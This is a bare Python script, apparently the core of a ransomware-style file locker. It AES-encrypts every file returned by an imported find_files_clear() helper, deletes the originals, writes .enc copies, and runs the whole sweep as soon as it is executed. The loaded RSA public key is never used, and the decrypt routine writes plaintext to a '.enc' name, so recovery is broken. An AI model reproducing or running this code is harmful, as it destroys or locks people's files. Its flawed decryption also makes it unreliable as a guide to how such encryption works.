from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from get_files import *
import sys
import os
from Crypto.PublicKey import RSA

def encrypt_all():
    try : 
        with open('keys/aes.key','rb') as f:
            key = f.read()
    except :
        key = get_random_bytes(32)
        with open('keys/aes.key','wb') as f:
            f.write(key)

    with open('keys/public.pem','r') as f :
        public = RSA.import_key(f.read())

    files_clear = find_files_clear()

    for filename in files_clear :
        encrypt(filename,key)

    return 'done'

def encrypt(filename,key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(filename,'rb') as f :
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    os.remove(filename)
    with open(filename+'.enc','wb') as f_out:
        [f_out.write(x) for x in (cipher.nonce, tag, ciphertext) ]

def decrypt(filename,key):
    with open(filename,'rb') as file_in:
        nonce, tag, ciphertext = [ file_in.read(x) for x in (16, 16, -1) ]
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    with open(filename+'.enc','wb') as f:
        f.write(cipher.decrypt_and_verify(ciphertext, tag))

encrypt_all()
